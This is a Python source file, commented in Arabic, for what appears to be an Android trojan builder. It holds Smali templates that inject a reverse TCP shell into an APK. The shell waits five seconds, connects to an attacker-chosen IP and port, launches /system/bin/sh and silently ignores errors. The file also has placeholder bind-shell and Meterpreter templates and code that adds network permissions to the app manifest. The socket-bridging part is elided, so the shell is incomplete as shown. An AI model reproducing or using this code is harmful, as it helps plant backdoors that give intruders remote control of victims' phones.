# 📁 builder_engine/code_injector.py
"""
حقن كود Reverse Shell في APK
"""

import os
import re
import tempfile
from pathlib import Path

class CodeInjector:
    def __init__(self):
        self.smali_templates = {
            'reverse_tcp': self._get_reverse_tcp_smali(),
            'bind_tcp': self._get_bind_tcp_smali(),
            'meterpreter': self._get_meterpreter_smali()
        }
    
    def _get_reverse_tcp_smali(self):
        """قالب Reverse TCP Shell في Smali"""
        return """
.method private startReverseShell()V
    .locals 6
    
    .catch Ljava/lang/Exception; {{:L_start}}
    
    :L_start
    # انتظار 5 ثواني
    const-wide/32 v0, 0x1388
    invoke-static {{v0, v1}}, Ljava/lang/Thread;->sleep(J)V
    
    # معلومات الاتصال
    const-string v0, "{ip}"
    const/16 v1, {port}
    
    # محاولة الاتصال
    new-instance v2, Ljava/net/Socket;
    invoke-static {{v0}}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;
    move-result-object v0
    invoke-direct {{v2, v0, v1}}, Ljava/net/Socket;-><init>(Ljava/net/InetAddress;I)V
    
    # فتح shell
    const-string v0, "/system/bin/sh"
    invoke-static {{v0}}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v0
    invoke-virtual {{v0, v0}}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    
    move-result-object v0
    
    # الحصول على Streams
    invoke-virtual {{v0}}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v1
    invoke-virtual {{v0}}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v3
    
    # الحصول على Socket Streams
    invoke-virtual {{v2}}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v4
    invoke-virtual {{v2}}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v5
    
    # إنشاء Threads للربط
    # ... (كود الربط الكامل)
    
    return-void
    
    :L_catch
    move-exception v0
    # تجاهل الأخطاء بهدوء
    return-void
.end method
"""
    
    def _get_bind_tcp_smali(self):
        """قالب Bind TCP Shell"""
        return """
.method private startBindShell()V
    .locals 5
    # كود Bind Shell
.end method
"""
    
    def _get_meterpreter_smali(self):
        """قالب Meterpreter"""
        return """
.method private startMeterpreter()V
    .locals 5
    # كود Meterpreter
.end method
"""
    
    def inject_to_apk(self, apk_path, shell_type='reverse_tcp', ip='192.168.1.100', port=4444):
        """حقن كود في APK"""
        
        # هذا تنفيذ مبسط - في الواقع يحتاج apktool
        print(f"[*] حقن {shell_type} في {apk_path}")
        
        # استخراج القالب وتخصيصه
        template = self.smali_templates.get(shell_type, self.smali_templates['reverse_tcp'])
        custom_code = template.replace('{ip}', ip).replace('{port}', str(port))
        
        # في الإصدار الكامل: نستخدم apktool لفك APK ثم حقن الكود
        # ثم نعيد بناء APK
        
        return custom_code
    
    def create_smali_class(self, class_name, shell_code):
        """إنشاء ملف Smali كامل"""
        smali_class = f".class public L{class_name};\n"
        smali_class += ".super Ljava/lang/Object;\n\n"
        smali_class += shell_code
        smali_class += "\n.end class"
        
        return smali_class
    
    def add_to_manifest(self, manifest_content, permissions=None):
        """إضافة صلاحيات لـ AndroidManifest.xml"""
        if permissions is None:
            permissions = [
                'android.permission.INTERNET',
                'android.permission.ACCESS_NETWORK_STATE'
            ]
        
        for perm in permissions:
            if perm not in manifest_content:
                # إضافة permission في المكان المناسب
                insert_pos = manifest_content.find('</manifest>')
                if insert_pos != -1:
                    perm_line = f'    <uses-permission android:name="{perm}" />\n'
                    manifest_content = manifest_content[:insert_pos] + perm_line + manifest_content[insert_pos:]
        
        return manifest_content